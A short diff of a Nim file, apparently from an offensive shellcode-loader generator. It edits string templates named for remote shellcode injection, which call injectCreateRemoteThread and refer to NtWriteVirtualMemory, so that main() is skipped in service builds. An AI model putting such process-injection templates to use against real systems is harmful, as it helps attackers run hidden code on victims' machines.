@@ -214,10 +214,12 @@ let ShellcodeRemoteInjectMapSection * = """
     injectCreateRemoteThread(enctext) 
 
 when not defined(proxy):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 
 when defined(defaultMain):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 
 """
 
@@ -377,7 +379,8 @@ let ShellcoderemoteinjectStub * = """
     injectCreateRemoteThread(dectext) # later on to be changed to enctext when decrypting after NtWriteVirtualMemory
 
 when not defined(proxy):
-    discard main(nil)
+    when not defined(service):
+        discard main(nil)
 """
 
 let ShellcoderemoteinjectStub_notepad * = """
